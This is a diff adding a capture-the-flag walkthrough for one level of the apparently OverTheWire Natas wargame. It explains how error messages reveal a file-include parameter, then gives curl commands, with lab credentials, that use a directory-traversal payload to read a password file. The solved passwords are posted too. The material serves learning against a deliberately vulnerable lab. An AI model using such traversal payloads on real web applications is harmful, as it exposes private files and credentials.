@@ -70,3 +70,21 @@ password: `bmg8SvU1LizuWjx3y7xkNERkHxGre0GS`.
 
 # Level 6 -> 7
 
+From the source code, the password is in the file `/etc/natas_webpass/natas8`. Observe links in the source code are in the form `index.php?page=<name>`. Using curl or browser, check that _about_ or _home_ files exist.
+
+```
+curl -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS http://natas7.natas.labs.overthewire.org/about
+```
+
+We can suppose the argument `page=<name>` refers to a file on disc. Using with the parameter `test` with `curl -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS http://natas7.natas.labs.overthewire.org/index.php\?page=test` will return an error message, showing us the working directory `/var/www/natas/natas7/`.
+
+We can now build the argument to display the content of the password file:
+
+```
+curl -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS http://natas7.natas.labs.overthewire.org/index.php\?page=../../../../etc/natas_webpass/natas8
+```
+
+password: `xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q`.
+
+# Level 7 -> 8
+
